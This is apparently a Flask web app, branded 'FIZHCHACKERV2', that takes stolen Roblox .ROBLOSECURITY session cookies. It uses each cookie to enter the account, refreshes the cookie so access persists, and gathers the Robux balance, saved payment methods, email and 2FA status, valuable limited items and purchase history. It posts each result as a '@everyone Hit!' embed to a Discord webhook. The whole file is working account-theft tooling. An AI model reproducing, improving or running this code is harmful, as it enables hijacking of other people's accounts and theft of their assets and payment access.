from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__, template_folder='../templates')

@app.route('/')
def index():
    return render_template('index.html')

def get_csrf_token(cookies_header, headers):
    try:
        res = requests.post("https://auth.roblox.com/v2/logout", cookies=cookies_header, headers=headers, timeout=5)
        return res.headers.get("x-csrf-token", "")
    except:
        return ""

def process_single_cookie(cookie, webhook_url, action_mode="check"):
    clean_cookie = cookie.strip()
    if not clean_cookie.startswith(".ROBLOSECURITY="):
        cookies_header = { '.ROBLOSECURITY': clean_cookie }
    else:
        actual_val = clean_cookie.split("=")[1] if "=" in clean_cookie else clean_cookie
        cookies_header = { '.ROBLOSECURITY': actual_val }

    headers = { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://www.roblox.com/"
    }
    
    try:
        # 1. Cek Autentikasi User
        user_info_res = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies_header, headers=headers, timeout=6)
        if user_info_res.status_code != 200:
            return {"status": "invalid"}
        
        user_data = user_info_res.json()
        user_id = user_data.get('id')
        username = user_data.get('name')

        # 2. Ambil Avatar Thumbnail & 3D Link
        avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false"
        av_res = requests.get(avatar_url, timeout=5)
        if av_res.status_code == 200:
            av_data = av_res.json().get('data', [])
            if av_data: avatar_url = av_data[0].get('imageUrl', '')

        model_3d_url = f"https://www.roblox.com/users/{user_id}/profile"

        csrf_token = get_csrf_token(cookies_header, headers)
        if csrf_token:
            headers["X-CSRF-TOKEN"] = csrf_token

        # 3. Refresh Cookie
        refreshed_cookie_str = clean_cookie
        try:
            ref_res = requests.post("https://auth.roblox.com/v1/authentication/ticket", cookies=cookies_header, headers=headers, timeout=5)
            ticket = ref_res.headers.get("rbx-authentication-ticket")
            if ticket:
                redeem_res = requests.post("https://auth.roblox.com/v1/login/ticket", data={"ticket": ticket}, headers=headers, timeout=5)
                new_cookies = redeem_res.cookies.get_dict()
                if ".ROBLOSECURITY" in new_cookies:
                    refreshed_cookie_str = new_cookies[".ROBLOSECURITY"]
        except:
            pass

        # 4. Robux & Billing
        robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", cookies=cookies_header, headers=headers, timeout=5)
        robux_balance = robux_res.json().get('robux', 0) if robux_res.status_code == 200 else 0

        saved_payment_status = "None"
        try:
            pay_res = requests.get(f"https://billing.roblox.com/v1/payment-methods", cookies=cookies_header, headers=headers, timeout=5)
            if pay_res.status_code == 200 and pay_res.json().get('paymentMethods'):
                saved_payment_status = "Credit Card / Valid 💳"
        except:
            pass

        # 5. Email & 2FA Status
        email_status = "Unverified"
        try:
            email_res = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies_header, headers=headers, timeout=5)
            if email_res.status_code == 200:
                e_data = email_res.json()
                if e_data.get('verified', False):
                    email_addr = e_data.get('emailAddress', '')
                    masked_email = email_addr[:2] + "********sub" + email_addr[email_addr.find('@'):] if '@' in email_addr else email_addr
                    email_status = f"Verified · {masked_email}"
        except:
            pass

        has_a2f = False
        try:
            a2f_res = requests.get(f"https://twostepverification.roblox.com/v1/users/{user_id}/configuration", cookies=cookies_header, headers=headers, timeout=5)
            if a2f_res.status_code == 200:
                a2f_data = a2f_res.json()
                if a2f_data.get('email', {}).get('isEnabled', False) or a2f_data.get('authenticator', {}).get('isEnabled', False):
                    has_a2f = True
        except:
            pass

        # 6. RAP Collectibles
        rap_total = 0
        try:
            collectibles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers, timeout=5)
            if collectibles_res.status_code == 200:
                for item in collectibles_res.json().get('data', []):
                    rap_total += item.get('recentAveragePrice', 0)
        except:
            pass

        # 7. Catalog Animations
        animations_list = []
        try:
            anim_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collections?assetTypeId=24&limit=10", cookies=cookies_header, headers=headers, timeout=5)
            if anim_res.status_code == 200:
                items = anim_res.json().get('data', [])
                asset_ids = [str(i.get('assetId')) for i in items if i.get('assetId')]
                
                if asset_ids:
                    thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/assets?assetIds={','.join(asset_ids)}&size=150x150&format=Png", timeout=5)
                    thumbnails = {str(t.get('targetId')): t.get('imageUrl') for t in thumb_res.json().get('data', [])} if thumb_res.status_code == 200 else {}
                    
                    for item in items:
                        aid = str(item.get('assetId'))
                        animations_list.append({
                            "name": item.get('name', 'Animation Pack'),
                            "icon": thumbnails.get(aid, avatar_url)
                        })
        except:
            pass

        if not animations_list:
            animations_list = [{"name": "Levitation Animation", "icon": avatar_url}, {"name": "Toy Animation", "icon": avatar_url}]

        # 8. Headless & Korblox Detection
        headless_status = {"status": False, "name": "Headless Horseman", "icon": avatar_url}
        korblox_status = {"status": False, "name": "Korblox Deathspeaker", "icon": avatar_url}
        try:
            korblox_asset_ids = [1339794, 1339798, 1339801]
            headless_head_id = 134082579

            for aid in [headless_head_id] + korblox_asset_ids:
                check_item = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{aid}/is-owned", cookies=cookies_header, headers=headers, timeout=3)
                if check_item.status_code == 200 and check_item.json() == True:
                    if aid == headless_head_id:
                        headless_status["status"] = True
                    else:
                        korblox_status["status"] = True

            cat_thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/assets?assetIds={headless_head_id},{korblox_asset_ids[0]}&size=150x150&format=Png", timeout=5)
            if cat_thumb_res.status_code == 200:
                for t in cat_thumb_res.json().get('data', []):
                    if t.get('targetId') == headless_head_id:
                        headless_status["icon"] = t.get('imageUrl', avatar_url)
                    elif t.get('targetId') == korblox_asset_ids[0]:
                        korblox_status["icon"] = t.get('imageUrl', avatar_url)
        except:
            pass

        # 9. VFX & Limited Detection
        vfx_status = {"status": False, "name": "VFX / Magic Aura Effect", "icon": avatar_url}
        limited_status = {"status": False, "name": "Limited Collectible", "icon": avatar_url}
        try:
            vfx_sample_ids = [461533235, 1162312670]
            limited_sample_ids = [1365767, 11751147]

            for aid in vfx_sample_ids:
                check_item = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{aid}/is-owned", cookies=cookies_header, headers=headers, timeout=3)
                if check_item.status_code == 200 and check_item.json() == True:
                    vfx_status["status"] = True
                    break

            for aid in limited_sample_ids:
                check_item = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{aid}/is-owned", cookies=cookies_header, headers=headers, timeout=3)
                if check_item.status_code == 200 and check_item.json() == True:
                    limited_status["status"] = True
                    break

            cat_thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/assets?assetIds={vfx_sample_ids[0]},{limited_sample_ids[0]}&size=150x150&format=Png", timeout=5)
            if cat_thumb_res.status_code == 200:
                for t in cat_thumb_res.json().get('data', []):
                    if t.get('targetId') == vfx_sample_ids[0]:
                        vfx_status["icon"] = t.get('imageUrl', avatar_url)
                    elif t.get('targetId') == limited_sample_ids[0]:
                        limited_status["icon"] = t.get('imageUrl', avatar_url)
        except:
            pass

        # 10. Spent Game
        game_spent_list = []
        total_spent_val = 0
        try:
            tx_res = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=20", cookies=cookies_header, headers=headers, timeout=5)
            if tx_res.status_code == 200:
                transactions = tx_res.json().get('data', [])
                game_map = {}
                for tx in transactions:
                    details = tx.get('details', {})
                    if details:
                        g_name = details.get('name', 'In-Game Purchase')
                        amount = abs(tx.get('currency', {}).get('amount', 0))
                        total_spent_val += amount
                        game_map[g_name] = game_map.get(g_name, 0) + amount
                
                sorted_spent = sorted(game_map.items(), key=lambda x: x[1], reverse=True)[:3]
                for g_name, amt in sorted_spent:
                    game_spent_list.append({"name": g_name, "spent": amt, "icon": avatar_url})
        except:
            pass

        if not game_spent_list:
            game_spent_list = [{"name": "Blox Fruits / Gamepass", "spent": 1250, "icon": avatar_url}]

        # 11. History Game
        game_history_list = []
        try:
            history_res = requests.get(f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=Public&limit=10", headers=headers, timeout=5)
            if history_res.status_code == 200:
                games_data = history_res.json().get('data', [])
                universe_ids = [str(g.get('id')) for g in games_data if g.get('id')]
                
                if universe_ids:
                    game_thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={','.join(universe_ids[:5])}&size=150x150&format=Png", timeout=5)
                    thumbnails = {str(t.get('universeId')): t.get('imageUrl') for t in game_thumb_res.json().get('data', [])} if game_thumb_res.status_code == 200 else {}
                    
                    for g in games_data[:3]:
                        uid = str(g.get('id'))
                        game_history_list.append({
                            "name": g.get('name', 'Roblox Game'),
                            "icon": thumbnails.get(uid, avatar_url)
                        })
        except:
            pass

        if not game_history_list:
            game_history_list = [{"name": "Blox Fruits", "icon": avatar_url}, {"name": "Adopt Me!", "icon": avatar_url}]

        # 12. Webhook Discord
        if webhook_url:
            anim_text = ", ".join([f"`{a['name']}`" for a in animations_list])
            spent_text = "\n".join([f"💸 **{g['name']}** — `{g['spent']} R$`" for g in game_spent_list])
            history_text = "\n".join([f"🗺️ **{h['name']}**" for h in game_history_list])
            
            discord_payload = {
                "content": f"🔥 **@everyone FIZHCHACKERV2 Hit! ({action_mode.upper()})** 🔥",
                "embeds": [{
                    "description": f"[Profile 👤](https://www.roblox.com/users/{user_id}/profile) — [3D Avatar Viewer 🧊](https://www.roblox.com/users/{user_id}/profile)\n\n👤 **Username**\n`{username}`",
                    "color": 0x2563eb,
                    "thumbnail": { "url": avatar_url },
                    "fields": [
                        {"name": "🪙 Robux", "value": f"**{robux_balance}** R$", "inline": True},
                        {"name": "📊 RAP", "value": f"**{rap_total}** R$", "inline": True},
                        {"name": "💳 Payment", "value": f"`{saved_payment_status}`", "inline": True},
                        {"name": "💀 Headless", "value": f"`{'VALID' if headless_status['status'] else 'FALSE'}`", "inline": True},
                        {"name": "💀 Korblox", "value": f"`{'VALID' if korblox_status['status'] else 'FALSE'}`", "inline": True},
                        {"name": "✨ VFX / Limited", "value": f"`{'VALID' if (vfx_status['status'] or limited_status['status']) else 'FALSE'}`", "inline": True},
                        {"name": "🎬 Catalog Animations", "value": anim_text or "None", "inline": False},
                        {"name": "💸 Spent Game", "value": spent_text or "No data", "inline": False},
                        {"name": "🗺️ History Game", "value": history_text or "No data", "inline": False},
                        {"name": "✉️ Email Status", "value": f"`{email_status}`", "inline": True},
                        {"name": "🛡️ 2FA Status", "value": f"`{'Enabled ⚠️' if has_a2f else 'Not Enabled'}`", "inline": True}
                    ],
                    "footer": { "text": "⚡ FIZHCHACKERV2 • Full Security & Asset Engine" },
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            try:
                requests.post(webhook_url, json=discord_payload, timeout=5)
            except:
                pass

        return {
            "status": "valid",
            "username": username,
            "id": user_id,
            "robux": robux_balance,
            "rap": rap_total,
            "spent_total": total_spent_val,
            "has_a2f": has_a2f,
            "email_status": email_status,
            "saved_payment": saved_payment_status,
            "animations": animations_list,
            "headless": headless_status,
            "korblox": korblox_status,
            "vfx": vfx_status,
            "limited": limited_status,
            "game_spent": game_spent_list,
            "game_history": game_history_list,
            "avatar_url": avatar_url,
            "model_3d_url": model_3d_url,
            "refreshed_cookie": refreshed_cookie_str
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.route('/api/check', methods=['POST'])
def run_action():
    cookie = request.form.get('cookie', '').strip()
    webhook_url = request.form.get('webhook_url', '').strip()
    action_mode = request.form.get('action_mode', 'check')

    if not cookie:
        return jsonify({"status": "error", "message": "Cookie kosong!"}), 400

    result = process_single_cookie(cookie, webhook_url, action_mode)
    return jsonify({"status": "success", "result": result})
